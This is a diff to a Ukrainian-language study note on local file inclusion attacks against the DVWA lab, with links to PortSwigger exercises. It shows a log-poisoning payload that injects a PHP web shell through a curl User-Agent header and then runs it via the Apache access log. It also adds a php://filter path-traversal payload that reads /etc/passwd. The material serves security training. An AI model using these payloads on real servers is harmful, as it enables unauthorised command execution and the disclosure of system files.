@@ -95,6 +95,10 @@
      curl -A "<?php system($_GET['cmd']); ?>" http://<DVWA-IP>/
      ```
    - Потім зверніться до `/var/log/apache2/access.log?cmd=id`
+   
+3. Спробувати атаки через PHP Wrapper (якщо сервер має фільтрацію LFI)
+   - Введіть `php://filter/convert.base64-encode/resource=../../../../../etc/passwd` у параметр файлу.
+   - Отримаємо вивід даних у кодуванні base64
 
 #### 🧪 PortSwigger Labs:
 - [File path traversal vulnerabilities](https://portswigger.net/web-security/file-path-traversal)
